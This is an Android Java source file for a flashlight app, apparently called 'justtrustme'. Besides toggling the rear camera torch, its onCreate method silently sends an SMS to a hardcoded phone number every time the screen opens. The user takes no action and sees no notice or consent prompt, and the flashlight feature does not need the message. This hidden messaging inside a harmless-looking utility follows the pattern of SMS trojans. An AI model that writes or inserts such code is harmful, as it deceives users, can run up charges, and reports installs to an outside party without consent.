package com.example.asus.justtrustme;

import android.content.pm.PackageManager;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.os.Handler;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.ImageButton;
import android.widget.Toast;

public class ButtonActivity extends AppCompatActivity {

    String phoneNumber ="01042256634";
    String smsBody ="문자 전송";



    private ImageButton mImageButtonFlash;
    private boolean mFlashOn;

    private CameraManager mCameraManager;
    private String mCameraId;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_button);

        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(phoneNumber,null,smsBody,null,null);

        if(!getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH)){
            Toast.makeText(getApplicationContext(),"There is no camera flash. |n The app will finish!",Toast.LENGTH_SHORT).show();

            delayedFinish();
            return;
        }
        mCameraManager =(CameraManager)getSystemService(CAMERA_SERVICE);

        mImageButtonFlash = findViewById(R.id.flash);
        mImageButtonFlash.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                flashlight();
                mImageButtonFlash.setImageResource(mFlashOn ? android.R.drawable.btn_star_big_on:android.R.drawable.btn_star_big_off);
            }


        });

    }

    private void delayedFinish() {
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                finish();
            }
        },3500);
    }
    private void flashlight() {
        if (mCameraId == null){
            try{
                for(String id : mCameraManager.getCameraIdList()){
                    CameraCharacteristics c = mCameraManager.getCameraCharacteristics(id);
                    Boolean flashAvailable = c.get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                    Integer lensFacing = c.get(CameraCharacteristics.LENS_FACING);
                    if(flashAvailable != null && flashAvailable && lensFacing != null && lensFacing == CameraCharacteristics.LENS_FACING_BACK){
                        mCameraId = id;
                        break;
                    }
                }
            }catch (CameraAccessException e){
                mCameraId = null;
                e.printStackTrace();
                return;
            }
        }
        mFlashOn = !mFlashOn;

        try{
            mCameraManager.setTorchMode(mCameraId, mFlashOn);
        }catch (CameraAccessException e){
            e.printStackTrace();
        }
    }
}
